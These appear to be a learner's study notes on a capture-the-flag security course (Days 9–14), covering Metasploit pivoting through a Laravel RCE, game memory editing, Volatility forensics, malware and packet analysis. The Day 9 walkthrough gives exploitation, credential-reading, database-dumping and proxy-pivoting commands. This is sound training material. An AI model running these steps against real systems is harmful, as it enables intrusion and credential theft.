# Resolve a set of host names on the target to IP addresses - useful for pivoting resolve remote_service1 remote_service2
```

### What is Pivoting?

- Once an attacker gains initial entry into a system, the compromised machine can be used to send additional web traffic through - allowing previously inaccessible machines to be reached.

- For example - an initial foothold could be gained through a web application running in a docker container or through an exposed port on a Windows machine. 
	- This system will become the attack launchpad for other systems in the network.

![](Pasted image 20221214092102.png)

#pivoting
- We can route network traffic through this compromised machine to run network scanning tools such as `nmap` or `[arp](arp.md)` to find additional machines and services which were previously inaccessible to the pentester. 
	- This concept is called network **pivoting**.

![](Pasted image 20221214092207.png)

#msfconsole
- After msfconsole is opened, there are multiple commands available:

```msfconsole
# To search for a module, use the ‘search’ command: 
msf6 > search laravel 

# Load a module with the ‘use’ command 
msf6 > use multi/php/ignition_laravel_debug_rce 

# view the information about the module, including the module options, description, CVE details, etc 
msf6 exploit(multi/php/ignition_laravel_debug_rce) > info
```

- After using a Metasploit module, you can view the options, set options, and run the module:

```msfconsole
# View the available options to set 
show options 

# Set the target host and logging 
set rhost 10.10.139.10 
set verbose true 

# Set the payload listening address; this is the IP address of the host running Metasploit 
set lhost LISTEN_IP 

# show options again 
show options 

# Run or check the module 
check 
run
```

- You can also directly set options from the `run` command:

![](Pasted image 20221214092944.png)

### Using Meterpreter to pivot

- Metasploit has an internal routing table that can be modified with the `route` command. 
- This routing table determines where to send network traffic through, for instance, through a Meterpreter session. 
- This way, we are using Meterpreter to pivot: sending traffic through to other machines on the network.

- Note that Meterpreter has a separate route command, which is not the same as the top-level Metasploit prompt's route command described below. 
- If you are currently interacting with a Meterpreter session, you must first `background` it.

```meterpreter
# Example usage 
route [add/remove] subnet netmask [comm/sid] 

# Configure the routing table to send packets destined for 172.17.0.1 to the latest opened session
route add 172.17.0.1/32 -1 

# Configure the routing table to send packets destined for 172.28.101.48/29 subnet to the latest opened session 
route add 172.28.10.48/29 -1 

# Output the routing table 
route print
```

### Socks Proxy
#socksproxy #proxy 

- A socks proxy is an intermediate server that supports relaying networking traffic between two machines. 
- This tool allows you to implement the technique of pivoting. 
- You can run a socks proxy either locally on a pentester’s machine via Metasploit, or directly on the compromised server. 
- In Metasploit, this can be achieved with the `auxiliary/server/socks_proxy` module:

![](Pasted image 20221214093408.png)

- Tools such as `curl` support sending requests through a socks proxy server via the `--proxy` flag:
```shell
curl --proxy socks4a://localhost:9050 http://10.10.139.10
```

- If the tool does not natively support an option for using a socks proxy, ProxyChains can intercept the tool’s request to open new network connections and route the request through a socks proxy instead. For instance, an example with Nmap:

```shell
proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 10.10.139.10
```

### Questions

- Ran nmap on the target:

![](Pasted image 20221214093711.png)

Deploy the attached VM, and wait a few minutes. What ports are open?

 A: 80

What framework is the web application developed with?  

- Checking out the Network tab in the Developer tools on the website we found on port 80 will reveal a laravel cookie

![](Pasted image 20221214094138.png)

 A: laravel

What CVE is the application vulnerable to?  

- A quick google search for laravel debug mode rce gets us a youtube link with the CVE in the title:

![](Pasted image 20221214094415.png)

 A:  CVE-2021-3129

- Checking if the target is vulnerable to this using `msfconsole`:

![](Pasted image 20221214094618.png)

- Indeed.

What command can be used to upgrade the last opened session to a Meterpreter session?  

 A: sessions -u -1 

What file indicates a session has been opened within a Docker container?  

 A: /.dockerenv

- Used `run lhost=10.10.218.181 rhost=10.10.139.10 HttpClientTimeout=20` in `msfconsole` to attack the vulnerable machine, where `lhost` is the ip address of the machine running msfconsole.

![](Pasted image 20221214095127.png)

- We got a shell
- We want to upgrade to a `meterpreter` shell
- So we run the following commands:

![](Pasted image 20221214095335.png)

- `sessions -i -1` to get into the new meterpreter session
- 

What file often contains useful credentials for web applications?  

- We do `cat /var/www/.env` in the meterpreter

![](Pasted image 20221214095522.png)

- We get some database credentials

 A: .env

- Get the ip adress of the service: `resolve webservice_database`
- We hit `background` and add the IP to the routing terminal:

![](Pasted image 20221214095727.png)

#important
- We can also see, due to the presence of the `/.dockerenv` file, that we are in a docker container. 
- By default, Docker chooses a hard-coded IP to represent the host machine. We will also add that to our routing table for later scanning: `route add 172.17.0.1/32 -1`

- Checking everything was added correctly:

![](Pasted image 20221214095858.png)

- With the previously discovered database credentials and the routing table configured, we can start to run Metasploit modules that target Postgres. 
- Starting with a schema dump, followed by running queries to select information out of the database:
	- `use auxiliary/scanner/postgres/postgres_schemadump`
	- `run postgres://postgres:postgres@172.28.101.51/postgres`
- We get a bunch of info:

![](Pasted image 20221214100127.png)

![](Pasted image 20221214100201.png)
What database table contains useful credentials?  

 A: users

What is Santa's password?  

- We run:
	- `use auxiliary/admin/postgres/postgres_sql`
	- `run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'

- We get santa's pw

![](Pasted image 20221214100350.png)

 A: `p4$$w0rd`

What ports are open on the host machine?  

- To further pivot through the private network, we can create a socks proxy within Metasploit:
	- `use auxiliary/server/socks_proxy`
	- `run srvhost=127.0.0.1 srvport=9050 version=4a`

- This will expose a port on the attacker machine that can be used to run other network tools through, such as `curl` or `proxychains`

![](Pasted image 20221214100828.png)

- We see that SSHs 22 port is opened

- With the host scanned, we can see that port 22 is open on the host machine. 
- It also is possible that Santa has re-used his password, and it’s possible to SSH into the host machine from the Docker container to grab the flag:
	- `use auxiliary/scanner/ssh/ssh_login`
	- `run ssh://santa:p4$$w0rd@172.17.0.1`
- Had to change the session also
- In my case, this session had the id of 4
	- So I did `sessions -i 4`

![](Pasted image 20221214101318.png)

 A: 22,80

What is the root flag?

![](Pasted image 20221214101201.png)

A: THM{47C61A0FA8738BA77308A8A600F88E4B}
 

## [Day 10] `Hack a game` You're a mean one, Mr. Yeti

#memory

### The Memory of a Program

- Whenever we execute a program, all data will be processed somehow through the computer's RAM (Random Access Memory). 
- If you think of a videogame, your HP, position, movement speed and direction are all stored somewhere in memory and updated as needed as the game goes.

- If you can modify the relevant memory positions, you could trick the game into thinking you have more HP than you should or even a higher score! 
- This sounds relatively easy, but a program's memory space is vast and sparse, and finding the location where these variables are stored is nothing you'd want to do by hand. 
- Hopefully, some tools will help us navigate memory and find where all the juicy information is at.

#cetus

### The Mighty Cetus

- Cetus is a simple browser plugin that works for Firefox and Chrome, allowing you to explore the memory space of Web Assembly games that run in your browser. 
- The main idea behind it is to provide you with the tools to easily find any piece of data stored in memory and modify it if needed. 
- On top of that, it will let you modify a game's compiled code and alter its behaviours if you want, although we won't need to go that deep for this task.

![](Pasted image 20221216165336.png)

- If you walk around the game, you will find that the guard won't let you leave unless you guess a randomly generated number. 
- At some point, the game must store this number in memory. 
	- Cetus will allow us to pinpoint the random number's memory address quickly.

- As a first step, talk to the guard and try to guess the number randomly. 
	- You probably won't guess it first try, but take note of the guard's number.

![](Pasted image 20221216165628.png)

![](Pasted image 20221216165742.png)

- With Cetus on the bookmarks tab, talk to the guard again and notice how the random number changes immediately

![](Pasted image 20221216170010.png)

- While you are wondering what other data in memory could be changed to survive the bridge, Elf Recon McRed tells you that he read about **differential search**. 
- Differential Search, he said, allows you to run successive searches in tandem, where each search will be scoped over the results of the last search only instead of the whole memory space. 

- To help you better understand, he used the following example: suppose you want to find an address in memory, but you are not sure of the exact value it contains, but you can, however, manipulate it somehow by doing some actions in the game (you could manipulate the value of your position by moving, for example). 
- Instead of doing a direct search by value as before, you can use differential search to look for memory positions based on specific **variations on the value**, rather than the value itself.

### Questions

  
What is the Guard's flag?

- Pressing space next to the guard after he unlocks the door will get you the flag:

![](Pasted image 20221216170117.png)

A: THM{5_star_Fl4gzzz}

What is the Yeti's flag?

- First I searched for all of the memory values with no value entered:

![](Pasted image 20221216171205.png)

- Then I do another search but only after I take some hits from the snowballs:

![](Pasted image 20221216171249.png)

- Then I do this again and I observe that there is one memory address that keeps decreasing and also it is kind of telling me the HP that i have left


![](Pasted image 20221216171143.png)

- I immediately change this to a very high value and I am through:

![](Pasted image 20221216171403.png)

- After some discussions, I get the flag:

![](Pasted image 20221216171451.png)
A: 

## [Day 11] `Memory Forensics` Not all gifts are nice

#volatility #memory #memoryforensics

### What is Memory Forensics?

- Memory forensics is the analysis of the volatile memory that is in use when a computer is powered on. 
- Computers use dedicated storage devices called Random Access Memory (RAM) to remember what is being performed on the computer at the time. 
- RAM is extremely quick and is the preferred method of storing and accessing data. 
- However, it is limited compared to storage devices such as hard drives. 
- This type of data is volatile because it will be deleted when the computer is powered off. 
	- RAM stores data such as your clipboard or unsaved files. 

- We can analyse a computer's memory to see what applications (processes), what network connections were being made, and many more useful pieces of information. 
- For example, we can analyse the memory of a computer infected with malware to see what the malware was doing at the time.

- Let's think about cooking. You normally store all of your food in the fridge - a hard drive is this fridge. 
- When you are cooking, you will store ingredients on the kitchen counter so that you can quickly access them, but the kitchen counter (RAM) is much smaller than a fridge (hard drive)

### Why is Memory Forensics Useful?

- Memory forensics is an extremely important element when investigating a computer. 
- A memory dump is a full capture of what was happening on the Computer at the time, for example, network connections or things running in the background. 
- Most of the time, malicious code attempts to hide from the user. 
	- However, it cannot hide from memory.

- We can use this capture of the memory for analysis at a later date, especially as the memory on the computer will eventually be lost (if, for example, we power off the computer to prevent malware from spreading). 
	- By analysing the memory, we can discover exactly what the malware was doing, who it was contacting, and such forth.

### An Introduction to Processes
#process

- At the simplest, a process is a running program. 
	- For example, a process is created when running an instance of notepad. 
- You can have multiple processes for an application (for example, running three instances of notepad will create three processes). 
- This is important to know because being able to determine what processes were running on the computer will tell us what applications were running at the time of the capture.

- On a computer, processes are usually categorised into two groups:

![](Pasted image 20221216172251.png)

### Introducing Volatility  

#volatility

- Volatility is an open-source memory forensics toolkit written in Python. 
- Volatility allows us to analyse memory dumps taken from Windows, Linux and Mac OS devices and is an extremely popular tool in memory forensics. 
- For example, Volatility allows us to:
	-   List all processes that were running on the device at the time of the capture
	-   List active and closed network connections
	-   Use Yara rules to search for indicators of malware
	-   Retrieve hashed passwords, clipboard contents, and contents of the command prompt
	-   And much, much more!

- Once Volatility and its requirements (i.e. Python) are installed, Volatility can be run using `python3 vol.py`.
- Volatility requires  a few arguments to run:
	-   Calling the Volatility tool via `python3 vol.py`
	-   Any options such as the name and location of the memory dump
	-   The action you want to perform (I.e. what plugins you want to use)

![](Pasted image 20221216172541.png)

- Volatility uses plugins to perform analysis, such as:
	-   Listing processes
	-   Listing network connections
	-   Listing contents of the clipboard, notepad, or command prompt
	-   And much more! If you're curious, you can read the documentation [here](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.html)

### Using Volatility to Analyse an Image  

- Before proceeding with our analysis, we need to confirm the Operating System of the device that the memory has been captured from. 
	- We need to confirm this because it will determine what plugins we can use in our investigation.

- First, let's use the `imageinfo` plugin to analyse our memory dump file to determine the Operating System. 
- To do this, we need to use the following command (remembering to include our memory dump by using the `-f` option): `python3 vol.py -f workstation.vmem windows.info`.

_Note: This can sometimes take a couple of minutes, depending on the size of the memory dump and the hardware of the system running the scan._

- We can see that Volatility has confirmed that the Operating System is Windows. With this information, we now know we need to use the Windows sub-set of plugins with Volatility.
- Thus, we can use the following plugins:

![](Pasted image 20221216173510.png)

- _Please note that this is not all of the possible plugins. An extensive list of the Windows sub-set of plugins can be found [here](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.windows.html)._

-

### Questions 

What is the Windows version number that the memory image captured?  
  
_Note: this initial scan may take up towards 10 minutes to complete. Why not grab some water or stretch your legs?_

- Used the command: `python3 vol.py -f workstation.vmem windows.info`.

![](Pasted image 20221216173328.png)

A: 10

What is the name of the binary/gift that secret Santa left?  

- Used the command: `python3 vol.py -f workstation.vmem windows.pslist`.

![](Pasted image 20221216173741.png)

A: mysterygift.exe

What is the Process ID (PID) of this binary?  

A: mysterygift.exe

Dump the contents of this binary. How many files are dumped?

- Used the command: `python3 vol.py -f workstation.vmem windows.dumpfiles --pid 2040`.

![](Pasted image 20221216174140.png)

A: 16
## [Day 12] `Malware Analysis` Forensic McBlue to the REVscue!

#malware #malwareanalysis

- A prominent word in cybersecurity, **malware** is software created to harm a computer or an entire network. 
- Threat actors develop malware to achieve specific goals, such as infiltrating networks, breaching sensitive data, or disrupting operational services.

- If you were to inspect several malware samples in the wild, a typical pattern arises, making analysing other samples easier with experience. 
- Knowing these common behaviours gives us an idea of what to look for on the defensive side, such as:
	-   **Network connections** - Malware tends to establish either external network connections or internal connections. External connections allow remote access or for downloading staged payloads from a threat actors' infrastructure. Meanwhile, internal connections allow for lateral movement, a technique used to extend access to other hosts or applications within the network.
	-   **Registry key modifications** - Malware typically uses registry keys to establish persistence, a technique used by threat actors to discreetly maintain long-term access to a system despite disruptions. A good example is Registry Run Keys, which allows binaries to be automatically executed when a user logs in or the machine boots up.
	-   **File manipulations** -  Malware also tends to download (one of the common reasons to establish network connections) or create new files needed for its successful execution.

- Given this knowledge, we can expect the possible behaviour of malware during an investigation.

### Dangers of Analysing Malware Samples

- With this, here are some helpful tips when handling live malware: 

	-   Always assume that malware samples will infect your device; hence executing it is not always the first and only step in analysing it.
	-   Only run the malware sample in a controlled environment that prevents potential compromise of unwanted assets.
	-   It is always recommended to have your **sandbox,** which allows you have a worry-free execution of malware samples.

- A **sandbox** is a controlled test environment that mimics a legitimate end-user working environment. 
- It gives analysts a safe environment to execute malware samples and learn their behaviour. 
- Lastly, having a ready sandbox prevents analysts from running malware samples in their workstations, which is highly dangerous and impractical for the possibility of unwanted impact.

- In a typical setup, sandboxes also provide automated analysis at the disposal of Security Analysts to determine if a binary from a set of malware samples requires further manual investigation.

### Static and Dynamic Analysis

- We have understood the prerequisites needed to handle the malware safely from the previous section. 
- Now, let's have a quick refresher on the two methods of malware analysis.

- **Static Analysis** is a way of analysing a malware sample without executing the code. 
	- This method mainly focuses on profiling the binary with its readable information, such as its properties, program flow and strings.
	- Given the limitation of not executing it, sometimes this method gives insufficient information, which is why we resort to Dynamic Analysis.   

- Meanwhile, **Dynamic Analysis** mainly focuses on understanding the malware by executing it in a safe environment, such as a Sandbox. 
	- By doing this, you will see the malware live in action, its exact behaviour, and how it infects the environment.

### **Detect It Easy**
#die
- Right-click the sample and execute **Detect It Easy (DIE)**. 
- This tool provides information about the file, such as its architecture, significant headers, packer used, and strings. 
- In this task, we will only utilise the basic functionalities of Detect It Easy to gain the basic information needed to analyse the binary. 
	- If you want to learn more about this tool, you may refer to this [link](https://github.com/horsicq/Detect-It-Easy).

- Packing malware is a common technique used by malware developers to compress, obfuscate or encrypt the binary. 
	- With this, contents such as significant strings and headers will not be immediately visible to Static Analysis Tools.

- You may test this information by doing the following:
	-   View the strings from Detect It Easy, which shows an overwhelming number of strings that are not that significant for investigation.
	-   Note: Strings are pieces of text inside a binary, often containing information such as IP addresses, URLs, or file names used by the malicious program.
	-   Run **CAPA,** which shows that the binary mostly hides its logic and analysis is affected due to a packer.

![](Pasted image 20221216204526.png)

### **CAPA**
#capa
- **CAPA** detects capabilities in executable files. 
	- May it be for the installation of a service, invocation of network connections, registry modifications and such.

- Given the CAPA output, we have discovered that the malware sample is packed. You may have also seen previously from **Detect It Easy** that the binary is packed by UPX.

- So now, let's unpack the binary using UPX and re-analyse the binaries using CAPA.

![](Pasted image 20221216205126.png)

- You may observe that CAPA now has provided important information about the malware sample.

- Note: We have executed `del mysterygift.viv` to delete the cached results of the first CAPA execution. By deleting the viv file, CAPA re-analyses the binary with accurate results.

![](Pasted image 20221216205340.png)


### Deep-dive into Dynamic Malware Analysis

- You may have observed that we cannot execute the binary after double-clicking it, as its file extension is not `.exe`.

- Before renaming and executing the binary, let's prepare the tool we need for analysing its behaviour - ProcMon. ProcMon, or Process Monitor, is a Windows tool that shows real-time registry, file system, and process/thread activity. 
	- You can learn more about it [here](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon). 

- Once opened, you will be prompted by  **Process Monitor Filter -**  a feature that allows us to filter the results logged by ProcMon. 
- In this case, we want to only focus on events generated by `mysterygift.exe` process. 
- Let's set the condition `Process Name - is - mysterygift.exe` ; add the filter and choose **OK** to close the prompt.

![](Pasted image 20221216205840.png)

- ProcMon has a panel that can filter the following, as highlighted in the image below (in sequence):

	-   Show Registry Activity
	-   Show File System Activity
	-   Show Network Activity
	-   Show Process and Thread Activity
	-   Show Profiling Events
![](Pasted image 20221216210433.png)

#### **Registry Modification**

- First, we want to determine if any significant Registry Modifications are executed by the binary, which is one of the expected behaviours introduced in this task.

- To do this, unclick all filters and only choose **Show Registry Activity**. The results still give several results so let's add a filter by finding all Registry Key Creations and Modifications. Remove the following Operations by right-clicking an entry from the Operation column and choosing **Exclude '<operation (e.g. RegQueryKey)>'** similar to the image below:

-   RegOpenKey
-   RegQueryValue
-   RegQueryKey
-   RegCloseKey

![](Pasted image 20221216210703.png)

- You may observe that only one Registry Key has both **RegCreateKey** and **RegSetValue**. 
- This key is related to a persistence technique called **Registry Run Key Modification** and is commonly used by malware developers to install a backdoor.

#### File Modification

- Now, let's also determine if the malware sample executes File Creations. 
	- It may indicate that the malware drops prerequisite files for its successful execution.

- Unclick all filters and choose the second filter - **Show File System Activity**. 
- Again, the results are still numerous so let's add extra filters by focusing only on **File Write** events. Remove the following Operations again by right-clicking an entry from the Operation column and choosing` Exclude '<operation (e.g. CreateFile)>'`:

-   CreateFile
-   CreateFileMapping
-   QuerySecurityFile
-   QueryNameInformationFile
-   QueryBasicInformationFile
-   CloseFile
-   ReadFile

The view from ProcMon should yield fewer results, similar to the image below.

![](Pasted image 20221216211401.png)

- you may observe that two files are written under the `**C:\Users\Administrator**` directory.
- The first file is located in the user's **TEMP** directory, which is commonly used by malware to drop another file for its disposal. 
	- The other file is written in the **STARTUP** directory, also used for persistence via **Startup Folders**.

#### **Network Connections**

- Lastly, let's confirm if the malware sample attempts to make a network connection. 
	- It may indicate that the malware communicates with external resources to download or establish remote access.

- Unclick all filters and choose the third filter - Show Network Activity. 
	- Unlike the previous filters, the results are few and can be easily interpreted.

![](Pasted image 20221216211743.png)


### Conclusion  

- We have covered several topics on this task about Malware Analysis. 
- For a quick summary, we have learned the following:

	-   Key behaviours of malware aid in having an overview of what to expect in examining malware samples. 
	-   The precautions needed to consider while handling malware samples and the importance of sandboxes.
	-   Conduct a Static Analysis and profile the nature of the binary without executing it. 
	-   Perform a manual Dynamic Analysis and observe the interactions of the malware sample in the **Registry**, **File System** and **Network**.

### Questions

  
What is the architecture of the malware sample? (32-bit/64-bit)

- Opened the sample with DIE:

![](Pasted image 20221216204320.png)

 A: 64-bit

What is the packer used in the malware sample? (format: lowercase)  

 A: upx

What is the compiler used to build the malware sample? (format: lowercase)  

- Ran CAPA with the options `-vv`

![](Pasted image 20221216204937.png)

 A: Nim


How many MITRE ATT&CK techniques have been discovered attributed to the DISCOVERY tactic?  

- Running CAPA again after we unpack the malware gives better results:


![](Pasted image 20221216205340.png)


 A: 2


What is the registry key abused by the malware?  

- Can be seen in the Process Monitor walkthrough.

 A: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\`


What is the value written on the registry key based on the previous question?  

- Can be seen in the details tab

 A: `C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wishes.bat`


What are the names of two files created by the malware under the C:\Users\Administrator\ directory? (format: file1,file2 in alphabetical order)  

- Filter the results so that you only have `WriteFiles`'s

 A: test.jpg,wishes.bat

What are the two domains wherein malware has initiated a network connection? (format: domain1,domain2 in alphabetical order)  

 A: bestfestivalcompany.thm,virustotal.com

Going back to strings inside the malware sample, what is the complete URL used to download the file hosted in the first domain accessed by the malware?

- Went back to DIE and look through `Strings`
- Filter it using `thm`

![](Pasted image 20221216212226.png)




A: `http://bestfestivalcompany.thm/favicon.ico`
## [Day 13] `Packet Analysis` Simply having a wonderful pcap time

#pcap #packets 

### Packets and Packet Analysis?

- Packets are the most basic unit of the network data transferred over the network. 
- When a message is sent from one host to another, it is transmitted in small chunks; each called a packet. 
- Packet analysis is the process of extracting, assessing and identifying network patterns such as connections, shares, commands and other network activities, like logins, and system failures, from the prerecorded traffic files.

### Why Does Packet Analysis Still Matter?

- Network traffic is a pure and rich data source. 
- A Packet Capture (PCAP) of network events provides a rich data source for analysis. 
- Capturing live data can be focused on traffic flow, which only provides statistics on the network traffic. 
- On the other hand, identifying and investigating network patterns in-depth is done at the packet level. 
- Consequently, threat detection and real-time performance troubleshooting cannot be done without packet analysis.

- Today, most network-based detection mechanisms and notification systems ingest and parse packet-level information to create alerts and statistical data. 
- Also, most red/blue/purple teaming exercises are optimised with packet-level analysis. 
- Lastly, even encoded/encrypted network data still provides value by pointing to an odd, weird, or unexpected pattern or situation, highlighting that packet analysis still matters.

### Points to consider when working with PCAPs

- There are various points to consider before conducting packet analysis. 
- The essential points are listed below.

![](Pasted image 20221216221839.png)

- When the time comes to do "packet level analysis", it might sound hard to implement the theory in practice. 
- But creating "checklists" and "mini playbooks" will make the analysis process considerably easier. 
- A simple process checklist for practical packet analysis is shown below.

![](Pasted image 20221216222012.png)

### What is Wireshark and How to Use It?
#wireshark 

- Wireshark is an industry-standard tool for network protocol analysis and is essential in any traffic and packet investigation. 
- You can view, save and break down the network traffic with it. 
- You can learn more about Wireshark by completing the [**Wireshark module**](https://tryhackme.com/module/wireshark).

![](Pasted image 20221216222433.png)

- You can also view the connections by IP and TCP/UDP protocols to view the overall usage of the ports and services (including the total packet numbers transferred over a particular port and between two hosts). 
- The next step is viewing the IP conversations to spot if there is a weird/suspicious/not usual IP address in use.

![](Pasted image 20221216222716.png)

- Now we have a detailed list of the IP addresses, port numbers, and the number of packets transferred from one endpoint to another. 
	- This information will help us identify suspicious IP addresses, connections and ports.

- Let's analyse the findings in this section; navigate to the TCP part and look at the results, the port 80 is used as a communication medium in TCP. 
	- Port 80 represents the HTTP service. 
- Next, you can view that DNS service is also used by navigating to the UDP section. 
	- Now we have two target protocols to analyse. 
- Before continuing on specific protocol analysis, you should have completed the following checks and answered some analysis questions.
-   **Checks to do**
	-   Packet statistics
	-   Service identification
	-   IP reputation check

-   **Questions to answer**

	-   Which IP addresses are in use?
	-   Has a suspicious IP address been detected?
	-   Has suspicious port usage been detected?
	-   Which port numbers and services are in use?
	-   Is there an abnormal level of traffic on any port or service?  
    
- After viewing the conversations, we collected the following information.
	-   Source and destination IP addresses
	-   Protocols
	-   Port numbers
	-   Services

- Now let's focus on the HTTP and DNS. 
- As a nature of these protocols, everything transferred over these protocols is cleartext. 
- At this stage, filtering the DNS packets to view the interacted domains is a good start before deep diving into cleartext data.

- DNS packets will help us to identify connected domain addresses to decide if they are affiliated with the suspicious threat and Bandit Yeti APT! 
- Click on the first packet and use the lower left section of the tool (Packet Details Pane) to view the packet details. 
- There are multiple collapsed sections; click on the `Domain Name System` section to expand and view the DNS details of the packets. 
- There are additional collapsed sections under the corresponding section; expand them to view all available details. 
- You will find the interacted domain under the `queries` section. 
- See the below example and continue the analysis by analysing all available DNS packets.

![](Pasted image 20221216223941.png)

Before continuing on HTTP analysis, ensure you have completed the following checks and answered the analysis questions.  

-   **Checks to do**

	-   DNS queries
	-   DNS answers

-   __Questions to answer__

	-   Which domain addresses are communicated?
	-   Do the communicated domain addresses contain unusual or suspicious destinations? 
	-   Do the DNS queries look unusual, suspicious or malformed?


-   Use the `HTTP` filter to filter and view the HTTP packets.

- Click on the first packet and view the details. 
- In HTTP, the **"GET Request"** is used by the client to send a request to a server. 
	- Usually, this request ends up with receiving data/resources. 
- Therefore, we will look at these requests to see if any endpoint is asked for a resource from other servers over the HTTP protocol. 

- Apply the filter and expand the `Hypertext Transfer Protocol` section. 
	- Expand the subsections as well and focus on the GET requests. 
- You will find the requested resource paths under the `Full Request URI` section. 
- Also, you can evaluate the `user-agent` section to check if there is anomalous or non-standard user-agent info. 

![](Pasted image 20221216224355.png)

- Two files are requested: `favicon.ico` and `mysterygift.exe`

- Before continuing to the next steps, ensure you have completed the following checks and answered the analysis questions.

-   __Checks to do__

	-   HTTP GET requests
	-   Requested URIs
	-   HTTP requests host addresses
	-   Used user-agents

-   __Questions to answer__

	-   Which addresses are communicated?
	-   Is there any resource share event between addresses?
	-   If there is a file share event, which addresses hosts which files?
	-   Do the user-agent fields look unusual, suspicious or malformed?

-   Use the `"File --> Export Object --> HTTP" ` menu to extract files shared over the HTTP.

- Look at the results. 
- There are two files shared over the HTTP. 
- Use the `Save All` option and save them on the desktop. 
- Now close/minimise the Wireshark GUI and open a terminal window on the desktop. 
- Use the `sha256sum` and `VirusTotal` tools shown on Day 6 to calculate the file hash value and to conduct hash-based file reputation analysis.

![](Pasted image 20221216225455.png)

- Before concluding the analysis, ensure you have completed the following checks and answered the analysis questions.  

-   __Checks to do__

	-   Shared files
	-   File hashes (SHA256)
	-   Hash reputation check

-   __Questions to answer__

	-   What are shared files?
	-   Does the hash reputation marked as suspicious or malicious?
	-   Which domain hosts the suspicious/malicious file?

- After completing the demonstrated steps, we verified that one shared file was malicious.
- Before concluding the analysis, you need to correlate the findings and recall which address was hosting the malicious file.

- After finishing all the shown steps and completing the required checks, you are finished with the fundamental packet analysis process of the given case. 
- The following steps are creating a report of your findings and escalating the sample to the upper-level analysts, who will conduct a more in-depth analysis.

Your report should include the following information you collected in this task.

-   Suspicious IP addresses associated with Bandit Yeti APT
-   Suspicious domain addresses associated with Bandit Yeti APT
-   Connection with suspicious addresses
-   Requested URIs
-   Used user-agents
-   Shared file names, extensions and hashes
-   Server names hosted the shared files

- This was the initial analysis process of a PCAP file. 
- An in-depth analysis will create detection rules to strengthen the implemented defences and block these activities in the future.

### Questions

  
View the "Protocol Hierarchy" menu.

What is the "Percent Packets" value of the "Hypertext Transfer Protocol"?

 A: 0.3

View the "Conversations".  
Navigate to the TCP section.

Which port number has received more than 1000 packets?

 A: 3389

What is the service name of the used protocol that received more than 1000 packets?  

![](Pasted image 20221216222841.png)

- Port 3389 is used for RDP

 A: RDP

Filter the DNS packets.

What are the domain names?  
Enter the domains in alphabetical order and defanged format. (format: domain[.]zzz,domain[.]zzz)

- FIlter the dns packets:

![](Pasted image 20221216223818.png)

- We see that we have two queries and two responses, hence we have two domains
- We defang them using CyberChef

 A: `cdn[.]bandityeti[.]thm,bestfestivalcompany[.]thm`

  

Filter the HTTP packets.

What are the names of the requested files?  
Enter the names in alphabetical order and in defanged format. (format: file[.]xyz,file[.]xyz)

 A: `favicon[.]ico,mysterygift[.]exe`

Which IP address downloaded the executable file?  
Enter your answer in defanged format.  

- It is the first http packet
- The one we downloaded the file is the source IP address

 A: `10[.]10[.]29[.]186`

  

Which domain address hosts the malicious file?  
Enter your answer in defanged format.  

- We click on the http packet and expand the Hypertext Transfer Protocol tab


![](Pasted image 20221216224833.png)

 A:`cdn[.]bandityeti[.]thm

What is the "user-agent" value used to download the non-executable file?  

- We expand the same tab but of the other http packet

![](Pasted image 20221216225047.png)

 A: Nim httpclient/1.6.8

Export objects from the PCAP file.  
Calculate the file hashes.

What is the sha256 hash value of the executable file?

 A: 0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f

 
Search the hash value of the executable file on VirusTotal.  
Navigate to the "Behaviour" section.  
There are multiple IP addresses associated with this file.

What are the connected IP addresses?  
Enter the IP addressed defanged and in numerical order. (format: IPADDR,IPADDR)  
  
  
Please note that the VT entry changed since the official walkthrough video was recorded - check the VT website to get all the IP addresses you need!

- The hash of `mysterygift.exe` is `0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f`
- Searched it on VirusTotal:

![](Pasted image 20221216230040.png)

- Ignored the first and the last and also the DNS server

A: `20[.]99[.]133[.]109, 20[.]99[.]184[.]37, 23[.]216[.]147[.]64, 23[.]216[.]147[.]76`

## [Day 14] `Web Applications` I'm dreaming of secure web apps

#web #[idor](Concepts/Idor.md) #owasp 

### Web Application

- A web application is a piece of software that we can use via a web browser. 
- Unlike computer programs and smartphone applications, a web application does not require any installation on the user’s system to make use of it. 
- To use a web application, we only need a web browser, such as Firefox, MS Edge, Google Chrome, or Safari.

- There are many advantages for the user. 
- Because it only needs a web browser, a user can access a web application from a Microsoft Windows system, a Mac computer, or a Linux system. 
	- If the user can use a modern web browser, they can access the web application. 
- They will be able to see the same interface and enjoy a very similar experience even with different systems. 
	- They can even access the same web application from a web browser on their smartphones, and their experience would only be affected by the screen size and what it can hold.

- Moreover, there are many advantages for the software developer. 
	- Instead of developing an application for macOS, another for MS Windows, and a third for ChromeOS, they only need to build one web application and ensure that it is compatible with the different modern browsers.

- The following are some examples of popular web applications:

	-   **Webmail:** Examples include Tutanota, ProtonMail, StartMail, and Gmail.
	-   **Online Shopping:** Some examples are Etsy, Amazon, eBay, and AliExpress.
	-   **Online Banking:** Modern banks increasingly allow clients to carry out their banking operations from a web browser.
	-   **Online Office Suite:** Consider, for instance, Microsoft Office 365, Zoho Office, and Google Drive.


### Database

- When discussing web applications, it is essential to mention database systems. 
	- Many web applications need to access vast amounts of data. 
- Even the most basic online shopping web application requires saving information about available products, customer details, and purchases. 
- We must find a solution to hold such information and to read from and write to the existing data efficiently. 
	- The answer lies in using a database system.

- There are two popular database models:
	-   __Relational Database:__ It stores the data in tables. Tables can share information. 
		- Consider the basic example with three tables: `products`, `customer_details`, and `purchases`. 
		- The `purchases` table would use information from the `products` table.
-   Non-Relational Database: It is any database that does not use tables. 
	- It might store the data in documents, and graph nodes, among other types.

- Generally speaking, a web application needs to constantly query the database, for example, to search for information, add new records, or update existing ones.

### Access Control

- Consider the case where you are using an online shop as a customer. 
- After logging in successfully, you should be able to browse the available products and check products’ details and prices, among other things. 
- Depending on the online shop, you might be able to add a question or a review about the product; however, as a customer, you should not be able to change the price or details. 
	- That’s due to access control.

- Access control is a security element that determines who can access certain information and resources. 
	- After authentication, access control enforces the appropriate access level. 
- In the online shopping example, a vendor should be able to update the prices or descriptions of their products. 
	- However, they should not be able to modify the information related to other vendors. 
